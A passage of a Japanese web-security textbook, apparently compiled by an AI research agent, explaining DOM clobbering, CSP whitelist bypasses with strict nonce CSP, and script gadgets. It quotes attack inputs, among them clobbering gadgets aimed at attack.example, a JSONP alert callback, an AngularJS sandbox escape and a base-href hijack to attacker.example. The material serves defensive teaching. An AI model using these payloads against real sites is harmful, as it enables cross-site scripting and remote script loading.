> なぜ動くか: `AMP_MODE`という名前は、開発者が「絶対に外部から上書きされない内部変数」だと想定していたが、それは単なる`window`スコープの変数であり、DOM Clobberingの対象になり得た。フィルタは既知の危険な識別子(`"AMP"`)だけをブロックリスト方式で防いでおり、関連する別の内部識別子(`AMP_MODE`)を見落としていた。ブロックリスト型の防御は、対象システムの内部実装(変数名の全体像)を完全に把握できない限り漏れが生じるという典型例。

Bentkowskiはさらに研究を進め、`AMP_MODE.test`と`AMP_MODE.localDev`という2つのプロパティを共にtruthyにし、加えて`window.testLocation`という別の変数もclobberすることで、AMPランタイムに「これはテスト/ローカル開発環境である」と誤認させ、本来は運用環境では読み込まれないはずの任意のリモートJavaScriptファイルを読み込ませる経路を構築しました。複数のDOM要素(`id`と`name`の組み合わせ)を巧妙に配置することで、単一の変数だけでなく、条件分岐を成立させる複数の関連プロパティを同時にclobberするというテクニックです。

最終的にこの脆弱性は理論上フルのXSSに到達するものでしたが、実際の攻撃としてはAMPコンテンツに対して別途デプロイされていたContent-Security-Policy(CSP)によってコード実行そのものは緩和されていた、という点も報告されています。この事例は、DOM Clobberingを見つけた後に「それが本当にコード実行まで到達するか」を確認する多層防御(CSPなど)の重要性も同時に示しています。

> 出典: XSS in GMail's AMP4Email via DOM Clobbering — https://research.securitum.com/xss-in-amp4email-dom-clobbering/ (二次情報: SecurityWeek, sekurak.pl 等の報道に基づく要約)

### 資料2: OWASP DOM Clobbering Prevention Cheat Sheet

> ⚠️ **未取得の資料の補足について**: `cheatsheetseries.owasp.org`への直接アクセスは本環境のegressプロキシでブロックされましたが、OWASP CheatSheetSeriesリポジトリのGitHub上のMarkdown原本(raw.githubusercontent.com経由)を取得できたため、内容は反映されています。念のため一次情報は以下のURLからも参照できます: https://cheatsheetseries.owasp.org/cheatsheets/DOM_Clobbering_Prevention_Cheat_Sheet.html

OWASPのこのチートシートは、DOM Clobberingの定義を「攻撃者が、セキュリティ上重要な変数やブラウザAPIと**同じ`id`または`name`属性**を持つHTML要素を注入することで、その値を意図的に上書きする攻撃」と整理し、13項目の防御ガイドラインを2つのグループに分けて提示しています。

**グループA: 技術的対策(実行環境・ツールでの緩和)**

- **HTMLサニタイザの適切な設定**: DOMPurifyを使う場合、`SANITIZE_NAMED_PROPS`オプションを有効化すると、`id`/`name`属性の値に`user-content-`のようなプレフィックスが自動付与され、名前空間の衝突を防げます。

```js
DOMPurify.sanitize(dirty, { SANITIZE_NAMED_PROPS: true });
```

> なぜ動くか: 属性値そのものを書き換えてしまえば、攻撃者が`id="redirectTo"`のような「狙った名前」を注入しても、実際にDOMへ反映される値は`id="user-content-redirectTo"`のように変形され、コード側が参照する変数名と一致しなくなるため、名前付きプロパティの衝突が起こらなくなる。

- **CSPの活用**: `script-src`によるスクリプト読み込み元の制限は、DOM Clobberingを起点として「外部スクリプトを動的に読み込ませる」タイプの攻撃(前述のconfig.url例)を緩和できます。ただし、`eval()`やテンプレートエンジンのコード評価構造を悪用するタイプのDOM Clobbering(スクリプトの新規ロードを伴わない、既存コードのロジック改変)には効果がありません。
- **重要なオブジェクトの凍結**: `Object.freeze(window)`のように重要なグローバルオブジェクトを不変化する手法もありますが、保護すべき対象を漏れなく洗い出すことは実務上困難です。

**グループB: セキュアコーディングの実践**

- **明示的な変数宣言**(`var`/`let`/`const`の徹底): ただし、興味深いことに`let`で宣言したブロックスコープ変数であっても、**`window.VARNAME`という形でのDOM Clobberingから完全には保護されない**とされています。これは`let`がグローバルの`window`オブジェクトのプロパティにはならない一方で、コードが`window.VARNAME`のように明示的に`window`経由でアクセスしていれば、依然としてclobberされたプロパティを読んでしまうためです。
- **`document`/`window`をグローバルな値の保存先に使わない**: これらのオブジェクトはHTMLの構造次第でいつでも改変されうる「信頼できない共有状態」であるため。
- **組み込みAPIであっても無条件に信頼しない**: 名前付きプロパティ可視性アルゴリズムにより、ブラウザ組み込みのプロパティやメソッドさえもDOM要素によって上書きされうるため、値を使う前に検証が必要です。
- **型チェックの実装**(`instanceof`): clobberされた値は必ず`Element`(または`HTMLCollection`)のインスタンスになるため、

```js
if (window.config instanceof HTMLElement) {
  // clobberされている可能性が高いので使わない
}
```

のように期待する型(文字列、プレーンオブジェクトなど)と実際の型を照合することで検出・防御できます。
- **strictモードの有効化**: 意図しないグローバル変数の暗黙的な生成を防ぎ、読み取り専用プロパティへの代入時に例外を発生させることで、一部のclobbering起因のバグを早期に顕在化させます。
- **ブラウザの機能検出を先に行う**: 未対応ブラウザでは該当APIが`undefined`のままになるため、そこがclobberingの標的になりやすい。事前にfeature detectionを行い、未定義を前提としたロジックを減らすことが推奨されます。
- **変数のスコープを可能な限りローカルに限定する**、**カプセル化(クラスやクロージャによるプライベート化)**、**本番環境でのユニークな変数名の採用**も、いずれも「グローバルな名前空間の衝突面」を減らすという同じ原理に基づく対策です。

このチートシートが強調する最も重要な結論は、「名前付きプロパティアクセスの優先順位はブラウザの仕様であり、Webアプリケーション側で変更することはできない」という点です。つまり防御は「衝突が起きないように名前空間を守る」か「衝突が起きても実害が出ないように値を検証する」という**回避戦略**に本質的に依存します。

> 出典: DOM Clobbering Prevention Cheat Sheet (OWASP CheatSheetSeries) — https://cheatsheetseries.owasp.org/cheatsheets/DOM_Clobbering_Prevention_Cheat_Sheet.html

### 資料3: DOM Clobbering Collection(研究/ガジェット集)

`jackfromeast/dom-clobbering-collection`は、実際のクライアントサイドライブラリに存在したDOM Clobbering可能な「ガジェット」(clobberingを使って到達可能な、危険なコードパス)と、それに関連するHTMLインジェクション脆弱性を体系的に収集したリポジトリです。研究時点でDOM Clobberingガジェットが35件、関連するHTML Injection脆弱性が12件記録されており、影響を受けたライブラリにはビルドツール(Vite、Webpack、Astro、rollup)、数式レンダリングライブラリ(MathJax v2/v3)、シンタックスハイライトライブラリ(Prism)、Googleの共通ライブラリ(Closure Library)などが含まれます。

代表的なガジェット例:

```html
<img src="https://attack.example/x" name="currentScript">
```

> なぜ動くか: 一部のビルドツールが生成するランタイムコードは、現在実行中の`<script>`要素の情報を`document.currentScript`から取得してモジュール解決の基準パスを決めることがある。しかし`currentScript`もまた名前付きプロパティの対象になりうる名前であり、ページ内に`name="currentScript"`を持つ`<img>`などの要素が存在すると、`document.currentScript`がその偽の要素にclobberされ、ライブラリが本来のスクリプトタグではなく攻撃者の`src`情報を「現在のスクリプト」として誤認してしまう。これによりモジュールの読み込み元パスが操作可能になる。

```html
<form name="scripts">alert(1)</form><form name="scripts">alert(1)</form>
```

> なぜ動くか: 同名の`<form>`要素を複数配置すると、`document.scripts`(本来はページ内の`<script>`要素一覧を返す組み込みのライブコレクション)が、名前付きプロパティの解決順位により`HTMLCollection`(自作フォーム集合)にすり替わる。ライブラリが「`document.scripts`は常にScript要素のコレクションだ」と無条件に信じて反復処理などを行っていると、意図しないオブジェクトを処理させられ、ロジックの破綻や後続のXSSにつながる。

```html
<a id="MathJax"></a> <a id="MathJax" name="root" href="https://attack.example"></a>
```

> なぜ動くか: MathJaxは初期化時にグローバルな`MathJax`オブジェクト(設定やルートパスを保持)を参照するが、これも変数名の衝突対象になる。`id`が重複した`<a>`要素で`HTMLCollection`を作り、その中の`name="root"`要素で`.root`プロパティを持たせることで、MathJaxが期待する「設定オブジェクトの`root`プロパティ(スクリプトの読み込みベースパス)」を攻撃者のURLにすり替え、任意のリモートスクリプトを読み込ませることができる。

このリポジトリが示す実務上の教訓は次の3点に整理できます。

1. **影響の多くはXSS(30件超)だが、CSRFも一定数観測されている**(plausible-analyticsやplotly.jsなど)。これはDOM Clobberingが「JavaScriptの意思決定ロジックを狂わせる」攻撃全般に応用可能であり、XSSに限定されないことを示します。
2. **多くのケースで根本原因はライブラリ側の「グローバル状態への暗黙の依存」**であり、mermaidやtui.editorのように、事後的にDOMPurifyのようなサニタイザを組み込むことで修正されています。
3. **一部のライブラリ(plausible-analytics、plotly.js、Prismなど)は報告後も未修正のまま**とされており、DOM Clobberingは「理論上は昔から知られているが、実際のライブラリでの対策は依然として発展途上」という現在進行形の脅威であることが読み取れます。

> 出典: dom-clobbering-collection — https://github.com/jackfromeast/dom-clobbering-collection

### まとめ

DOM Clobberingは、スクリプトの実行そのものを禁止するサニタイザやCSPだけでは防ぎきれない、**ブラウザの名前付きプロパティ解決という仕様レベルの挙動**を悪用する攻撃です。攻撃者はHTMLタグの`id`/`name`属性という一見無害な入力だけで、JavaScriptが信頼している変数・組み込みAPI・設定オブジェクトのプロパティをすり替え、最終的にはスクリプトの動的ロードやURLベースのsinkを通じてXSSやCSRFに到達させます。Gmail AMP4Emailの事例が示すように、ブロックリスト方式のフィルタは内部実装の全体像を把握しない限り漏れが生じやすく、防御側は「名前空間の汚染を防ぐ」(サニタイザでの属性値変形、命名規則の統一)と「値を使う前に型を検証する」(`instanceof`によるチェック)の両輪で対策する必要があります。

---

## CSPの限界（CSP Is Dead 論文）

CSP（Content Security Policy、コンテンツセキュリティポリシー）は、ブラウザにHTTPレスポンスヘッダとして「どのオリジンからスクリプトを読み込んでよいか」を宣言することで、反射型・格納型を問わずXSSの実行を防ぐ目的で設計された多層防御機構である。しかし2016年、Googleのセキュリティチーム（Lukas Weichselbaum, Michele Spagnuolo, Sebastian Lekies, Artur Janc）が発表した論文 **"CSP Is Dead, Long Live CSP! On the Insecurity of Whitelists and the Future of Content Security Policy"**（ACM CCS 2016）は、実運用されているCSPの**94.72%が回避可能**であることを大規模実測で示し、業界に衝撃を与えた。本節では、なぜホワイトリスト方式のCSPが機能しないのか、その仕組み上の理由と、代替として提案された「strict CSP（nonceベースCSP）」の設計原理を学ぶ。

### CSPの基本的な考え方（前提の整理）

CSPは以下のようなヘッダで配信される。

```
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com https://www.google.com
```

ブラウザは、HTMLをパース中にスクリプトタグやインラインスクリプトの実行要求に遭遇するたびに、そのスクリプトの「ソース（読み込み元URL、あるいはインラインかどうか）」を`script-src`ディレクティブの許可リスト（ホワイトリスト）と照合する。一致しなければブロックし、コンソールに違反ログを出す。これにより、攻撃者が`<script>alert(1)</script>`のような任意のインラインスクリプトを注入できても、CSPが`'unsafe-inline'`を許可していなければ実行されない、というのが素朴な期待である。

この「ホワイトリスト方式」は直感的でわかりやすいが、論文が指摘したのは、**実際のWebサイトが必要とする外部スクリプトの多くが、それ自体XSSに悪用可能な「JSONPエンドポイント」や「古いライブラリバージョン」を抱えている**という現実である。

### なぜホワイトリストは機能しないか：仕組みレベルの説明

論文はGoogleの検索エンジンインデックス（約1000億ページ、10億ホストの規模）を使い、CSPを配信している168万ホスト・26,011個のユニークなポリシーを収集して自動解析した。その結果、94.72%のポリシーがバイパス可能と判定された。バイパスの主な原因は次の3種類に整理できる。

#### 1. ホワイトリストに含まれるドメインの「脇道」の悪用

CSPは**オリジン（プロトコル+ホスト+ポート）単位**でしか許可・拒否を判定できず、そのオリジン配下のどのパス・どのファイルが安全かまでは検証しない。したがって、`script-src https://www.google.com`のように大手CDNやプラットフォームのドメインをまるごと許可すると、そのドメイン配下にたまたま存在する以下のようなリソースが「合法な攻撃経路」になる。

- **JSONPエンドポイント**：`https://accounts.google.com/o/oauth2/revoke?callback=alert(1)`のように、クエリパラメータの値をそのままJavaScriptとして実行するcallback系API。CSPの`script-src`は「そのオリジンから読み込まれたスクリプト」を許可しているだけなので、攻撃者がその許可オリジン上のJSONPエンドポイントを見つけてcallback引数に任意コードを注入すれば、CSPを一切迂回せずに任意JS実行が成立する。
- **アップロード機能を持つエンドポイント**：ユーザーがファイル（JSやHTMLとして解釈されうるファイル）をアップロードできる、許可済みドメイン上の機能（例：`docs.google.com`のようなオフィス系サービスや、掲示板・CMSのアバターアップロード機能）。
- **古いライブラリバージョンの温存**：`ajax.googleapis.com`や`cdnjs.cloudflare.com`のような公開CDNをまるごと許可すると、攻撃者はそのCDNがホストする「脆弱なバージョンの古いAngularJS」等を`<script>`で読み込ませることができる。AngularJSの一部バージョンには、テンプレートインジェクション経由でサンドボックスを脱出しCSPをすり抜けて任意コードを実行できる既知の脆弱性があり（例：AngularJS 1.6系まで存在した`{{constructor.constructor('alert(1)')()}}`系のサンドボックス回避）、CSPが「AngularJSの配布元ドメイン」を許可している場合、攻撃者はそのドメインから脆弱バージョンを読み込むだけでCSPの許可リストの内側から攻撃を完結できる。

これらはいずれも「ドメイン単位の許可」という設計そのものに起因する。CSPの評価アルゴリズムはURLのオリジン部分しか見ないため、パス以下にどんな機能があるかは一切考慮しない。**任意のJSライブラリを許可オリジン配下でホスト可能な仕組み（アップロード、オープンリダイレクト、JSONP、ファイル共有）が1つでも存在すれば、そのドメインを許可した時点でCSPは事実上無効化される**。論文はこのような「バイパス可能なホスト」を大量にリスト化し、Google自身のドメインを含む主要CDN・クラウドサービスの多くがこれに該当することを示した。

#### 2. `'unsafe-inline'`と`'unsafe-eval'`の常態的な使用

移行コストの問題から、多くのサイトは`script-src 'self' 'unsafe-inline'`のように`'unsafe-inline'`を付けたままCSPを運用していた。`'unsafe-inline'`が付いている場合、CSPは実質的に「インラインスクリプト注入を防ぐ」という最も基本的な役割さえ果たせない。反射型XSSで`<script>`タグを注入できるなら、CSPの有無に関わらず実行されてしまう。論文の統計では、多数の実運用ポリシーがこの状態にあり、CSPが「あるのに機能していない」典型例だった。

#### 3. 複雑なポリシー構文の誤設定

`script-src`を指定し忘れて`default-src`だけに頼っている、ワイルドカード（`*`）を安易に使っている、あるいは`https:`のようなスキームだけを許可してあらゆるHTTPSオリジンを許可してしまっている、といった設定ミスも多数観測された。`script-src https:`は「HTTPSであれば任意のドメイン」を許可するため、上記のJSONP/アップロード型バイパスの標的が実質無限に広がる。

> 出典: CSP Is Dead, Long Live CSP! On the Insecurity of Whitelists and the Future of Content Security Policy — https://research.google/pubs/csp-is-dead-long-live-csp-on-the-insecurity-of-whitelists-and-the-future-of-content-security-policy/

> ⚠️ **未取得の資料**: 「CSP Is Dead, Long Live CSP! On the Insecurity of Whitelists and the Future of Content Security Policy（research.google 掲載版）」は自動取得できませんでした（理由: 実行環境のegressプロキシにより research.google ドメインへのアクセスがブロックされているため）。以下のURLからユーザーご自身で直接ご覧ください: https://research.google/pubs/csp-is-dead-long-live-csp-on-the-insecurity-of-whitelists-and-the-future-of-content-security-policy/
>
> （以下は未取得資料の補足として、Web検索で得られた公開情報および一般知識に基づく解説です）論文本体はACM CCS 2016（Proceedings of the 2016 ACM SIGSAC Conference on Computer and Communications Security）に採録され、著者はLukas Weichselbaum、Michele Spagnuolo、Sebastian Lekies、Artur Jancの4名（いずれもGoogleのセキュリティチーム）。調査対象はおよそ1000億ページ・10億ホスト規模の検索インデックスから抽出した168万ホスト・26,011件のユニークCSPポリシーであり、これは当時「最大規模のCSP実測調査」と位置づけられた。中心的な結論は「ホワイトリスト方式のCSPは94.72%のケースでバイパス可能」というものであり、この結果を受けて論文はホワイトリストに依存しない新しいCSPの書き方として、CSP Level 3で標準化された`'strict-dynamic'`キーワードの採用を提案している。

### 代替アプローチ：nonceベースの「strict CSP」

論文が提案し、その後Googleが`strict-csp`として一般に啓発した設計は、「ドメインを信頼する」のではなく「個々のスクリプトを信頼する」という発想の転換に基づく。具体的な推奨ポリシーは次の形を取る。

```
Content-Security-Policy:
  script-src 'nonce-{RANDOM}' 'strict-dynamic';
  object-src 'none';
  base-uri 'none';
```

各ディレクティブの役割と、なぜこの組み合わせが従来のホワイトリストより堅牢なのかを、仕組みレベルで見ていく。

#### `'nonce-{RANDOM}'`：ドメインではなくトークンで許可する

サーバーはページを描画するたびに暗号学的に安全な乱数（nonce、one-time token）を生成し、レスポンスヘッダの`script-src`と、許可したい各`<script>`タグの`nonce`属性の両方に同じ値を埋め込む。

```html
<script nonce="r4nd0mBase64Value123">
  doSomething();
</script>
```

ブラウザはスクリプトを実行する前に、そのスクリプトタグの`nonce`属性値がCSPヘッダに書かれたnonce値と**文字列として完全一致するか**だけを確認する。攻撃者がXSSでインラインスクリプトを注入できたとしても、レスポンスヘッダに載っている正しいnonce値をリアルタイムで知る手段がなければ（HTTPレスポンスヘッダはJavaScriptから直接読み取れず、ページごとに値が変わる）、注入したスクリプトにその場でnonceを付与することはできない。これが「ドメインの脇道」を悪用する既存のバイパス手法をすべて無効化する理由である。JSONPエンドポイントや脆弱ライブラリを許可オリジン内に見つけたとしても、そのURLを`<script src="...">`で読み込ませようとする行為自体が、正しいnonceを持たない限りブロックされる。

#### `'strict-dynamic'`：正規スクリプトが動的に生成する子スクリプトだけを連鎖的に信頼する

現代のWebアプリは、`nonce`付きの最初の`<script>`が、さらに別の`<script>`要素をJavaScriptで動的に生成してDOMに挿入する、という構成（バンドラやトラッキングタグ、A/Bテストのローダーなど）を多用する。素朴なnonce方式だと、動的生成されたすべての子スクリプトタグに毎回nonceを付け直す必要があり非現実的になる。

`'strict-dynamic'`は、「正しいnonce（またはハッシュ）を持つスクリプトが、自分自身の実行中にJavaScriptのDOM API（`document.createElement('script')`など）を使って生成した新しいスクリプトは、そのnonceを持たなくても信頼する」という**伝播（プロパゲーション）ルール**をCSPに追加する。信頼の起点はあくまで「正しいnonceを持つ最初のスクリプト」であり、そこから動的に生成された子だけが連鎖的に信頼される。逆に、攻撃者がXSSで注入したスクリプトは、この信頼の連鎖の外側にあるため、たとえ`document.createElement`を呼んでも新たな信頼は生まれない。

`'strict-dynamic'`が指定されている場合、ブラウザはCSP Level 3対応環境において**それ以前に書かれたドメインホワイトリスト部分（例: `https://cdn.example.com`）を無視する**。これは後方互換性のための意図的な仕様で、CSP3非対応の古いブラウザでは従来のホワイトリストにフォールバックしつつ、対応ブラウザではnonceベースの厳格な検証に一本化される（`script-src 'nonce-XXX' 'strict-dynamic' https: http:`のように`https:`等を後方互換用に併記するのが定石）。

#### `object-src 'none'`：プラグイン経由の実行経路を封じる

`<object>`、`<embed>`、`<applet>`タグはFlashなど旧来のプラグインを読み込むためのもので、こうしたプラグイン内で実行されるコンテンツはCSPの`script-src`の管理下に入らず、独自にJavaScriptに似たコードを実行できる場合があった（例: 古いFlashの`ExternalInterface`経由でのJS実行）。`object-src 'none'`は、この「CSPの監視が及ばない実行経路」自体を完全に塞ぐ。nonce/strict-dynamicでスクリプトタグ経路をどれだけ堅牢にしても、プラグイン経由の抜け道を残せば無意味になるため、strict CSPでは必須のディレクティブとされる。

#### `base-uri 'none'`：`<base>`タグによる相対パス書き換え攻撃を封じる

HTMLの`<base href="...">`タグは、ページ内のすべての相対URL（`<script src="app.js">`のようなパス）の基準となるオリジンを書き換える。もし攻撃者がHTMLインジェクションで`<base href="https://attacker.example/">`を注入できれば、正規のページが`<script src="app.js">`のように相対パスでスクリプトを読み込んでいる箇所を、攻撃者のサーバーから配信される悪意あるコードにすり替えることができる。これはスクリプトタグ自体を新規に注入する必要がなく、既存の正規スクリプトタグの「読み込み先」を差し替えるだけなので、nonce検証を回避しうる。`base-uri 'none'`（または`base-uri 'self'`）はこの`<base>`タグの機能自体を無効化・制限し、相対パス書き換えによる読み込み先ハイジャックを防ぐ。

### strict CSPの効果と限界

DeepSec 2016のスライド版（"CSP Is Dead, Long Live Strict CSP!"）では、この設計をGoogle社内の主要プロダクト（例: Gmail等）に段階的に導入した経緯と、nonceベースCSPが従来のドメインホワイトリスト方式に比べて実際に高いXSS防御力を示したことが報告されている。ポイントは、CSPの信頼モデルを「どこから来たか（Where）」から「誰が生成したか（Who／実行系譜）」へ転換したことにあり、これによりオリジン単位の脇道探索という攻撃面をほぼ排除できる。

ただし、strict CSPも万能ではない。以下のような限界が残る。

- **DOM-based XSSでnonceを盗めるケース**：ページ内に既存の脆弱性（例: nonce値をDOMやJavaScript変数として露出させてしまう実装ミス、あるいはXSSではなく別の情報漏洩経路）があれば、攻撃者がnonce値そのものを取得して正規のnonce付きスクリプトタグを偽装できる可能性がある。nonceはHTTPレスポンスヘッダとHTML内にしか本来存在しないが、テンプレートエンジンの実装次第では`window.__nonce__ = "..."`のようにJS変数へ複製してしまう実装ミスが起こりうる。
- **`'unsafe-inline'`との共存不可**：strict CSPを機能させるには`'unsafe-inline'`を完全に廃止し、すべてのインラインスクリプト・イベントハンドラ属性（`onclick="..."`等）をnonce付き外部スクリプトまたは別の許可手段（ハッシュベース許可）に置き換える必要があり、レガシーなコードベースでは移行コストが高い。
- **信頼された型（Trusted Types）との併用が推奨**：nonceベースCSPはスクリプトの「読み込み」を制御するが、`innerHTML`等のsinkへのDOM-based XSSそのものを防ぐわけではないため、後続の防御層としてTrusted Types等の併用が推奨される（本教科書の別セクションで扱う）。
- **レポート専用モード（`Content-Security-Policy-Report-Only`）からの段階移行が前提**：既存の大規模サイトがいきなり強制ブロックモードに切り替えると正規機能を壊すリスクが高いため、まず違反レポートのみを収集するモードで実運用データを集め、誤検知を潰してから本番適用する運用が推奨される。

> ⚠️ **未取得の資料**: 「CSP Is Dead, Long Live Strict CSP! （Lukas Weichselbaum, DeepSec 2016 スライド）」は自動取得できませんでした（理由: 実行環境のegressプロキシにより deepsec.net ドメインへのアクセスがブロックされているため。GitHub上の代替ミラーも確認できませんでした）。以下のURLからユーザーご自身で直接ご覧ください: https://deepsec.net/docs/Slides/2016/CSP_Is_Dead,_Long_Live_Strict_CSP!_Lukas_Weichselbaum.pdf
>
> （以下は未取得資料の補足として、Web検索で得られた公開情報および一般知識に基づく解説です）本スライドは同名論文の著者Lukas WeichselbaumがDeepSec 2016カンファレンスで行った発表資料であり、論文の学術的な統計結果（94.72%バイパス可能）を踏まえて、実運用者向けに「strict CSP」導入の具体的な手順・ポリシー例・移行のベストプラクティスを提示する内容とされる。公開されているGoogleの啓発サイト（Content Security Policyの実践ガイド）でも同様の推奨ポリシーが示されており、代表例は次の形である。
>
> ```
> Content-Security-Policy:
>   object-src 'none';
>   script-src 'nonce-{random}' 'strict-dynamic' https: http: 'unsafe-inline';
>   base-uri 'none';
>   report-uri https://your-report-collector.example.com/
> ```
>
> ここで末尾に付く`https: http: 'unsafe-inline'`は、CSP Level 3（`'strict-dynamic'`とnonceを理解する対応ブラウザ）では無視される「意図的なフォールバック」であり、CSP3非対応の古いブラウザ向けに最低限のホワイトリスト＋`'unsafe-inline'`相当の緩い保護を残すためのものである。CSP3対応ブラウザは仕様上、`'strict-dynamic'`が存在する場合はホワイトリストと`'unsafe-inline'`を無視してnonce検証のみを行うため、新旧両対応のポリシーとして機能する。`report-uri`（および後継の`report-to`）は違反が起きた際にブラウザから自動的にJSON形式のレポートを指定エンドポイントへ送信させる仕組みで、本番投入前の検証や、投入後の攻撃観測・回帰検知に用いられる。

### まとめ：CSPを学ぶ上での要点

1. **ドメインホワイトリスト方式のCSPは、許可したドメインの中に「攻撃者が制御できる実行経路」（JSONP、アップロード機能、脆弱な古いライブラリ）が1つでもあれば実質的に無力化される**。これはCSPがオリジン単位でしか検証を行わないという設計上の制約に起因する、構造的な弱点である。
2. **nonceベースの`strict-dynamic`方式は、「どこから読み込むか」ではなく「誰（どの信頼された実行系譜）が生成したか」で許可を判定する**ことで、ドメイン単位の脇道探索という攻撃面そのものを消し去る。
3. `object-src 'none'`と`base-uri 'none'`は、スクリプトタグ以外の実行経路・書き換え経路を塞ぐための必須の補助ディレクティブである。
4. CSPは「多層防御の一層」であり、単体でXSSを根絶する銀の弾丸ではない。sink側の対策（安全なDOM API利用、Trusted Types等）と組み合わせて初めて実効性を持つ、という認識が本章全体を貫く前提となる。

---

## Script Gadgets（CSP Evaluator / Black Hat論文）

これまでの章では、CSP（Content Security Policy）を「攻撃者が任意のスクリプトを注入しても実行させない仕組み」として学んできた。しかし現実のWebアプリケーションには、jQueryやAngularJS、Bootstrap、あるいは自社のフロントエンドコードなど、大量の**信頼された（allowlistに載っている、あるいはページに元から存在する）JavaScriptライブラリ**が動いている。

**Script Gadgets（スクリプトガジェット）** とは、こうした「正規の、悪意のないJavaScriptコード」でありながら、**攻撃者が制御できるDOM要素（属性・クラス名・data属性など）を読み取り、その内容に基づいてスクリプトを実行してしまう副作用を持つコード片**のことを指す。攻撃者は、CSPやサニタイザ、WAF（Web Application Firewall）を通過できる「無害に見えるHTMLタグ・属性」だけを注入し、ページ上に既に存在するgadget（正規コード）に「解釈」させることで、間接的にスクリプトを実行させる。つまり、**攻撃者は`<script>`を注入する必要がない**。ページ側のライブラリが、注入されたマークアップを見て「これはUIコンポーネントの初期化指示だ」と誤解し、自らJavaScriptを実行してしまうのである。

この章では、この技法を体系化した研究（Black Hat USA 2017発表)と、CSPポリシーの脆弱性を機械的に検出するGoogleのツール「CSP Evaluator」を扱う。両者は表裏一体の関係にある。CSP Evaluatorは「このホストを許可すると、そこにScript Gadgetsが存在するかもしれない」という観点でポリシーを評価するツールであり、Script Gadgets研究はその脅威モデルの土台を作った論文だからである。

### 1. なぜCSPだけでは不十分なのか（背景となる原理）

CSPの`script-src`ディレクティブは基本的に「**どこから読み込まれたスクリプトか（送信元）**」を制御する仕組みであり、「**そのページに元から存在する正規のJavaScriptが、DOM上の何を読んで何をするか**」までは一切関知しない。

例えば以下のような、一見「安全そう」なCSPを考える。

```
Content-Security-Policy: script-src 'self' https://cdn.jquery.com;
```

このポリシーは、インラインスクリプト（`unsafe-inline`）を禁止し、外部スクリプトも`self`と信頼できるCDNからのみ許可している。素朴な反射型XSS（`<script>alert(1)</script>`や`<img onerror=alert(1)>`のようなインラインイベントハンドラ）は、CSPによって実行がブロックされる。

しかし、ページ上で読み込まれている`jQuery`自体（あるいはBootstrap、AngularJSなど）が、**DOM要素の属性を条件分岐なく解釈してコード実行に繋げる処理**を持っていた場合、攻撃者は`<script>`タグではなく、**一見無害な`<div>`や`<a>`タグに特定の属性を仕込むだけ**で、その正規コードにトリガーを引かせられる。これがScript Gadgetsの核心である。

つまり脅威モデルはこうなる。

- **前提1**: 何らかのHTMLインジェクション（サニタイザのバイパス、DOM-based XSSのマークアップ挿入ポイントなど）によって、攻撃者は**タグ名や属性値は制御できるが、`<script>`タグやインラインイベントハンドラ（`onerror`等）や`javascript:`スキームは使えない**（CSPやサニタイザがブロックするため）。
- **前提2**: ページには既に、DOM上の属性・クラス名を読んで処理を行うJavaScriptライブラリ（jQuery、AngularJS、Bootstrapの各種プラグインなど）がロードされている。
- **結果**: 攻撃者が挿入した「無害なマークアップ」を、そのライブラリが「実行指示」として誤読し、結果的に任意コード実行に至る。

この構造は、バイナリエクスプロイトにおける **ROP（Return-Oriented Programming、既存の実行可能コード断片＝gadgetをつなぎ合わせて任意の処理を組み立てる手法）** に類似することから、研究者らは「Webのコード再利用攻撃（Code-Reuse Attacks for the Web）」と呼んでいる。ROPが「バイナリ中の既存の命令列を再利用する」のに対し、Script Gadgetsは「ページ中の既存のJavaScriptロジックを再利用する」という対応関係にある。

### 2. Black Hat USA 2017論文「Don't Trust The DOM: Bypassing XSS Mitigations Via Script Gadgets」

#### 2.1 概要と位置づけ

本論文はSebastian Lekies、Krzysztof Kotowicz、Eduardo Vela Nava（Google）によって2017年のBlack Hat USAで発表された（同年ACM CCS 2017にも "Code-Reuse Attacks for the Web: Breaking Cross-Site Scripting Mitigations via Script Gadgets" として採録されている）。研究の核心は、当時「XSS対策の決定打」と考えられていた複数の技術――

- Content Security Policy（CSP）
- DOM Sanitizer（DOMPurifyなど）
- WAF（Web Application Firewall）
- ブラウザ組み込みのXSS Auditor / Filter（当時Chrome/IEに存在した）

――が、いずれも「**タグ・属性の並びだけを見て『危険かどうか』を判定する**」という設計上の限界を持っており、ページに元からロードされている**JavaScriptライブラリの実装次第で回避可能である**ことを、大規模な実証実験で示した点にある。

#### 2.2 手法（gadgetの探索）

研究チームは、Alexaランキング上位で広く使われる**主要なJavaScriptライブラリ（jQuery、AngularJS、Polymer、Bootstrap、Knockout、Ember、Google Closure、MooTools、YUI、Prototype.js など、論文では複数バージョンにわたり多数のライブラリ）を対象に静的・動的解析を行い、DOM要素の属性・クラス名・データ属性等を読み取ってコード実行につながる「gadget」を機械的に洗い出した**。

その結果、調査対象とした主要ライブラリの**ほぼすべてに1つ以上のgadgetが存在する**ことが判明した。これは「有名で信頼されたライブラリだから安全」という前提そのものを覆す結果であり、CSPの許可リストに「信頼できるCDNだから」という理由だけでライブラリのホストを追加することの危険性を裏付けた。

> ⚠️ **未取得の資料に関する補足**: Black HatのPDF本体（`blackhat.com`）は本環境のネットワーク制限により直接取得できませんでした。理由: 当該ドメインがegressプロキシでブロックされているため。原文は以下からユーザーご自身でご覧いただけます: https://blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf
> （以下は未取得資料の補足として、公開されている検索結果・関連論文情報・一般知識に基づく解説です。定量的な数値・図表・スライドの詳細な文言については、必ず原典PDFを直接ご確認ください。）

#### 2.3 具体的なgadgetの例（jQueryを題材に）

論文・関連発表で繰り返し取り上げられる典型例が、jQueryの**セレクタ処理とDOM挿入APIの組み合わせ**である。jQueryには、`$()`関数に渡された文字列がCSSセレクタなのかHTML断片なのかを内部でヒューリスティックに判定するロジックがあり、また多くのUIプラグイン（例えば旧式の`jQuery Mobile`や各種タブ/モーダルプラグイン）が「**特定の`data-*`属性やクラス名を持つ要素を見つけたら、その値をHTMLとして`.html()`や同種のsinkに渡して展開する**」という処理を実装していた。

例えば、次のような疑似コードのgadgetを考える（jQuery Mobileの一部で実際に確認された種類のパターンを単純化したもの）。

```html
<!-- 攻撃者が注入できるのは <script> ではなく、この無害に見えるタグと属性のみ -->
<div data-role="popup" data-content="<img src=x onerror=alert(document.domain)>"></div>
```

